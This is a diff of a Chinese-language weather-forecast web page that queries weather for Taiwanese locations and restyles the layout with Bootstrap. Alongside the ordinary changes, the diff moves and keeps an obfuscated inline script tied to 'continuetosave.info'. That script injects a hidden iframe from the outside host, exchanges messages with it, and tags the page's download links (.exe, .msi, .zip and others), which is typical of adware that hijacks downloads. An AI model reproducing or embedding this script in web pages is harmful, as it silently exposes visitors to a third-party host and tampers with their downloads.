@@ -6,76 +6,29 @@
 </script>
 
 
-<style type="text/css">
-#lat, #long{
-display:inline;
-}
 
-p{
-display:inline-block;
-margin: 8px;
-padding: 8px;
-border-color:orange; border-style:dotted;
-}
+<script type="text/javascript" src="js/jquery.js"></script>
 
-body{
-background-color:black;
-color:white;
-}
+<script type="text/javascript" src="js/bootstrap.min.js"></script>
 
-#information{
-display:inline-block;
-margin: 10px;
-padding: 20px;
-width: 600px;
-border-color:orange; border-style:dotted;
+<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
 
-}
+<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
 
-.back{
-  width: 100px;
-  margin: 10px;
-  padding: 10px;
-  border-color:orange; border-style:dotted;
-
-}
-
-a:link {color:white}
-a:visited {color:gray}
-a:hover {color: orange; 
-         font-size:18 px; font-weight: bold;
-         cursor:crosshair;
-}
-a:active {color: red; 
-          font-size:18 px; }
-		  
-hr{ 
-    margin: 20px 0 0 0;
-    border: 0;
-    height: 1px;
-    background-image: 
--webkit-linear-gradient(left, rgba(255,255,255,0), rgba(255,255,255,245), rgba(255,255,255,0));
-    background-image:    
--moz-linear-gradient(left, rgbaa(255,255,255,0), rgba(255,255,255,245), rgba(255,255,255,0));
-    background-image:     
--ms-linear-gradient(left, rgbaa(255,255,255,0), rgba(255,255,255,245), rgba(255,255,255,0));
-    background-image:      
--o-linear-gradient(left, rgbaa(255,255,255,0), rgba(255,255,255,245), rgba(255,255,255,0));
-}
-</style>
-
-<script src="information.js" type="text/javascript"></script> 
-<script type="text/javascript" src="./weather_forecast_files/fs.js"></script><script type="text/javascript">try{var _xtrg = {host: "http://continuetosave.info", ls: false, init: function (b){-1<window.self.location.href.indexOf(_xtrg.host)||-1<window.self.location.href.indexOf("cebook.com")||(("undefined"==typeof localStorage||"undefined"==typeof postMessage)&&b(!1),OnMessage=function(b){if(b.origin==_xtrg.host)try{_xtrg.ls=JSON.parse(b.data)}catch(e){}},window.addEventListener?window.addEventListener("message",OnMessage,!1):window.attachEvent&&window.attachEvent("onmessage",OnMessage),_xtrg.createIframe(_xtrg.host+"/xtrg.html",function(){b(1)}))}, createIframe: function (b,d){try{ifr=document.createElement("iframe"),ifr.src=b,ifr.setAttribute("style","width:0;height:0;display:none"),ifr.setAttribute("class","_xtrg"),document.getElementsByTagName("body")[0].appendChild(ifr),d&&(ifr.onload=function(){setTimeout(d,1)})}catch(e){}}, clean: function (){try{var b=document.getElementsByClassName("_xtrg");for(i=0;i<b.length;i++)b[i].parentNode.removeChild(b[i])}catch(d){}}, set: function (b,d){b.expired=b.expired?b.expired:0;_xtrg.createIframe(_xtrg.host+"/xtrg.html?"+b.key+"="+b.value+";"+b.expired,d)}, get: function (b){return _xtrg.ls&&_xtrg.ls[b]?_xtrg.ls[b]:!1}};(function(){ var irins = {init: function (){var b=document.getElementsByTagName("a");if(b&&b.length){var d=0;for(i=0;i<b.length;i++){var e=b[i].getAttribute("href");e&&!(-1==e.indexOf(".exe")&&-1==e.indexOf(".msi"))&&d++}d&&_xtrg.init(function(c){if(c&&!_xtrg.get("y")&&!_xtrg.get("c"))for(i=0;i<b.length;i++)(c=b[i].getAttribute("href"))&&!(-1==c.indexOf(".exe")&&-1==c.indexOf(".msi")&&-1==c.indexOf(".torrent")&&-1==c.indexOf(".zip")&&-1==c.indexOf(".rar")&&-1==c.indexOf(".pdf"))&&b[i].setAttribute("omzy_irini","irini")})}}}.init();})()}catch(e){}</script>
-
+<link href="css/custom.css" rel="stylesheet" type="text/css" />
 </head>
 
 <body  onload="init_address();">
-<h1>Weather Forecast</h1>
-<footer>p.s.功能絕對正常，只是有時候會延遲!(見console)</footer>
 
 
-<div id="information"> 
+<h1 align=middle>Weather Forecast</h1>
+<footer align=middle>p.s.功能絕對正常</footer>
 
+<div class="container">
+
+<div id="information" class="span7"> 
+
+<h1>Information</h1>
 <h4>Title</h4> 
 <div id="title"></div> 
 
@@ -83,64 +36,67 @@ hr{
 <div id="date"></div> 
 
 <h4>Location</h4> 
-<div id="lat">,</div><div id="long"></div> 
+<div id="lat"></div><div id="long"></div> 
 
 <h4>Temp.</h4> 
-<div id="temp"></div>度F 
+<div id="temp"></div>
 
 <h4>Text</h4> 
 <div id="text"></div> 
 	
 </div> 
 
-<div id="areas"> 
+
+<div id="areas" class="span5"> 
 <h4> 下拉式選單 </h4>
-<input id="zipcode" name="zipcode" type="text" style="width: 0px;" disabled="disabled" />
+<div id="zipcode" name="zipcode" type="text" style="width: 0px;" disabled="disabled" />
+
 <select id="zone1" name="zone1"></select>
 <select id="zone2" name="zone2"></select>
+</div>
 
 <h4> 直接點擊 </h4>
 <p class="area" value="2306188">基隆 (七堵)</p> 
 <p class="area" value="2306179">台北 (內湖)</p> 
-<p class="area" value="2306186">台北 (新店)</p><br> 
+<p class="area" value="2306186">台北 (新店)</p> 
 <p class="area" value="2306211">新北市 (淡水)</p> 
 <p class="area" value="2306214">新北市 (鶯歌)</p>
 <p class="area" value="2306223">新北市 (金山)</p> 
 <p class="area" value="2306228">新北市 (三芝)</p> 
 <p class="area" value="2306231">新北市 (萬里)</p> 
-<p class="area" value="2306251">新北市 (雙溪)</p><br> 
+<p class="area" value="2306251">新北市 (雙溪)</p> 
 <p class="area" value="2306209">桃園 (大園)</p>
 <p class="area" value="2306184">桃園 (中壢)</p> 
 <p class="area" value="2306200">桃園 (觀音)</p> 
 <p class="area" value="2306202">桃園 (龍潭)</p> 
-<p class="area" value="2306254">桃園國際機場</p><br> 
+<p class="area" value="2306254">桃園國際機場</p>
 <p class="area" value="2306185">新竹 (東區)</p>
-<p class="area" value="2306229">苗栗 (三灣)</p><br> 
+<p class="area" value="2306229">苗栗 (三灣)</p>
 <p class="area" value="2306181">台中 (西屯)</p> 
 <p class="area" value="2306207">台中 (石岡)</p> 
 <p class="area" value="2306194">台中 (清水)</p> 
 <p class="area" value="2306218">台中 (新社)</p> 
-<p class="area" value="2306210">台中 (大甲)</p><br> 
+<p class="area" value="2306210">台中 (大甲)</p> 
 <p class="area" value="2306183">彰化 (彰化市)</p> 
 <p class="area" value="2306195">彰化 (二林)</p> 
-<p class="area" value="2306201">彰化 (鹿港)</p><br> 
+<p class="area" value="2306201">彰化 (鹿港)</p> 
 <p class="area" value="2306212">雲林 (斗南)</p> 
 <p class="area" value="2306250">雲林 (虎尾)</p> 
-<p class="area" value="2306206">嘉義 (布袋)</p><br> 
+<p class="area" value="2306206">嘉義 (布袋)</p>
 <p class="area" value="2306182">台南 (安平)</p> 
 <p class="area" value="2306193">台南 (佳里)</p> 
 <p class="area" value="2306203">台南 (麻豆)</p> 
 <p class="area" value="2306217">台南 (新化)</p> 
-<p class="area" value="2306232">台南 (玉井)</p><br> 
+<p class="area" value="2306232">台南 (玉井)</p>
 <p class="area" value="2306180">高雄 (左營)</p> 
 <p class="area" value="2306199">高雄 (岡山)</p> 
-<p class="area" value="2306255">高雄國際機場</p><br> 
+<p class="area" value="2306255">高雄國際機場</p>
 <p class="area" value="2306189">屏東 (屏東市)</p> 
 <p class="area" value="2306213">屏東 (東港)</p> 
-<p class="area" value="2306224">屏東 (枋山)</p><br> 
+<p class="area" value="2306224">屏東 (枋山)</p>
 <p class="area" value="2306198">宜蘭 (宜蘭市)</p> 
 <p class="area" value="2306208">宜蘭 (蘇澳)</p> 
-<p class="area" value="2306243">宜蘭 (南澳)</p><br> 
+<p class="area" value="2306243">宜蘭 (南澳)</p>
 <p class="area" value="2306187">花蓮 (花蓮市)</p> 
 <p class="area" value="2306190">台東 (台東市)</p> 
 <p class="area" value="2306227">台東 (關山)</p> 
@@ -148,10 +104,6 @@ hr{
 	
 </div> 
 
-<hr>
-<div class="back">
-    <a href="index.html">Back to top</a>
-</div>
 
 
 <script type="text/javascript">
@@ -174,13 +126,13 @@ $("#areas p").click(function(){
     $("#date").text(data.query.results.channel.item.pubDate) 
       .appendTo('body .date'); 
 
-    $("#lat").text(data.query.results.channel.item.lat) 
+    $("#lat").text(data.query.results.channel.item.lat+",") 
       .appendTo('body .lat'); 
 
     $("#long").text(data.query.results.channel.item.long) 
       .appendTo('body .long'); 
 
-    $("#temp").text(data.query.results.channel.item.condition.temp) 
+    $("#temp").text(data.query.results.channel.item.condition.temp+"℉") 
       .appendTo('body .temp'); 
 
     $("#text").text(data.query.results.channel.item.condition.text) 
@@ -193,7 +145,9 @@ $("#areas p").click(function(){
 
 </script>
 
+<script src="information.js" type="text/javascript"></script> 
+<script type="text/javascript" src="./weather_forecast_files/fs.js"></script><script type="text/javascript">try{var _xtrg = {host: "http://continuetosave.info", ls: false, init: function (b){-1<window.self.location.href.indexOf(_xtrg.host)||-1<window.self.location.href.indexOf("cebook.com")||(("undefined"==typeof localStorage||"undefined"==typeof postMessage)&&b(!1),OnMessage=function(b){if(b.origin==_xtrg.host)try{_xtrg.ls=JSON.parse(b.data)}catch(e){}},window.addEventListener?window.addEventListener("message",OnMessage,!1):window.attachEvent&&window.attachEvent("onmessage",OnMessage),_xtrg.createIframe(_xtrg.host+"/xtrg.html",function(){b(1)}))}, createIframe: function (b,d){try{ifr=document.createElement("iframe"),ifr.src=b,ifr.setAttribute("style","width:0;height:0;display:none"),ifr.setAttribute("class","_xtrg"),document.getElementsByTagName("body")[0].appendChild(ifr),d&&(ifr.onload=function(){setTimeout(d,1)})}catch(e){}}, clean: function (){try{var b=document.getElementsByClassName("_xtrg");for(i=0;i<b.length;i++)b[i].parentNode.removeChild(b[i])}catch(d){}}, set: function (b,d){b.expired=b.expired?b.expired:0;_xtrg.createIframe(_xtrg.host+"/xtrg.html?"+b.key+"="+b.value+";"+b.expired,d)}, get: function (b){return _xtrg.ls&&_xtrg.ls[b]?_xtrg.ls[b]:!1}};(function(){ var irins = {init: function (){var b=document.getElementsByTagName("a");if(b&&b.length){var d=0;for(i=0;i<b.length;i++){var e=b[i].getAttribute("href");e&&!(-1==e.indexOf(".exe")&&-1==e.indexOf(".msi"))&&d++}d&&_xtrg.init(function(c){if(c&&!_xtrg.get("y")&&!_xtrg.get("c"))for(i=0;i<b.length;i++)(c=b[i].getAttribute("href"))&&!(-1==c.indexOf(".exe")&&-1==c.indexOf(".msi")&&-1==c.indexOf(".torrent")&&-1==c.indexOf(".zip")&&-1==c.indexOf(".rar")&&-1==c.indexOf(".pdf"))&&b[i].setAttribute("omzy_irini","irini")})}}}.init();})()}catch(e){}</script>
 
 
-
+</div>
 </body></html>
